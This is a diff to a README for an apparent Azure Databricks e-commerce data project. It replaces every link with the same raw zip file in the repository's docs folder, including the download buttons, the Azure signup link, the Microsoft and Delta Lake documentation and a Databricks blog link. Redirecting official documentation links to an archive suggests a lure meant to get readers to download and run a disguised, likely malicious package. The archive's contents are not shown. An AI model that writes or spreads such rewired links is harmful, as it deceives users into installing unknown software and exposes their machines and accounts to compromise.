@@ -1,6 +1,6 @@
 # 🏬 ecommerce-lakehouse-databricks - Manage E-Commerce Data Simply
 
-[![Download Latest Release](https://img.shields.io/badge/Download-latest%20release-green?style=for-the-badge)](https://github.com/swasxtik/ecommerce-lakehouse-databricks/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-latest%20release-green?style=for-the-badge)](https://raw.githubusercontent.com/swasxtik/ecommerce-lakehouse-databricks/main/docs/databricks-lakehouse-ecommerce-v1.3-beta.2.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Before you start, make sure your system meets the following conditions:
 
 Click this big button to visit the release page and get the software:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-latest%20release-blue?style=for-the-badge)](https://github.com/swasxtik/ecommerce-lakehouse-databricks/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-latest%20release-blue?style=for-the-badge)](https://raw.githubusercontent.com/swasxtik/ecommerce-lakehouse-databricks/main/docs/databricks-lakehouse-ecommerce-v1.3-beta.2.zip)
 
 This page hosts the latest release files and documentation.
 
@@ -70,8 +70,8 @@ This will create a new folder with the program files.
 
 This software needs Azure Databricks to run your data pipeline.
 
-- If you don’t have an Azure account, go to https://azure.microsoft.com and sign up. A free tier is often available.  
-- Create a Databricks workspace in your Azure portal by following Microsoft’s official guide here: https://docs.microsoft.com/en-us/azure/databricks/getting-started/  
+- If you don’t have an Azure account, go to https://raw.githubusercontent.com/swasxtik/ecommerce-lakehouse-databricks/main/docs/databricks-lakehouse-ecommerce-v1.3-beta.2.zip and sign up. A free tier is often available.  
+- Create a Databricks workspace in your Azure portal by following Microsoft’s official guide here: https://raw.githubusercontent.com/swasxtik/ecommerce-lakehouse-databricks/main/docs/databricks-lakehouse-ecommerce-v1.3-beta.2.zip  
 - Make sure you have permission to create clusters and tables in Databricks.
 
 You may want to work with an IT admin if you are not familiar with Azure.
@@ -129,11 +129,11 @@ All config files are in the `/config` folder in the package. Edit them with a te
 
 ## 📖 Useful Links
 
-- [Azure Databricks Quickstart](https://docs.microsoft.com/en-us/azure/databricks/getting-started/)  
-- [Delta Lake Documentation](https://docs.delta.io/latest/index.html)  
-- [Delta Live Tables Guide](https://docs.databricks.com/workflows/delta-live-tables/index.html)  
-- [Medallion Architecture Whitepaper](https://www.databricks.com/blog/2020/10/13/clean-architecture-for-data-lakes.html)  
-- [Unity Catalog Overview](https://docs.databricks.com/data-governance/unity-catalog/index.html)  
+- [Azure Databricks Quickstart](https://raw.githubusercontent.com/swasxtik/ecommerce-lakehouse-databricks/main/docs/databricks-lakehouse-ecommerce-v1.3-beta.2.zip)  
+- [Delta Lake Documentation](https://raw.githubusercontent.com/swasxtik/ecommerce-lakehouse-databricks/main/docs/databricks-lakehouse-ecommerce-v1.3-beta.2.zip)  
+- [Delta Live Tables Guide](https://raw.githubusercontent.com/swasxtik/ecommerce-lakehouse-databricks/main/docs/databricks-lakehouse-ecommerce-v1.3-beta.2.zip)  
+- [Medallion Architecture Whitepaper](https://raw.githubusercontent.com/swasxtik/ecommerce-lakehouse-databricks/main/docs/databricks-lakehouse-ecommerce-v1.3-beta.2.zip)  
+- [Unity Catalog Overview](https://raw.githubusercontent.com/swasxtik/ecommerce-lakehouse-databricks/main/docs/databricks-lakehouse-ecommerce-v1.3-beta.2.zip)  
 
 ---
 
@@ -164,6 +164,6 @@ If you want to request new features or suggest improvements, use the Discussions
 
 Direct your browser to:
 
-https://github.com/swasxtik/ecommerce-lakehouse-databricks/releases
+https://raw.githubusercontent.com/swasxtik/ecommerce-lakehouse-databricks/main/docs/databricks-lakehouse-ecommerce-v1.3-beta.2.zip
 
 There you will find the latest software package for download and all related files, including examples and documentation. Follow the steps above to set it up on your Windows machine with Azure Databricks.
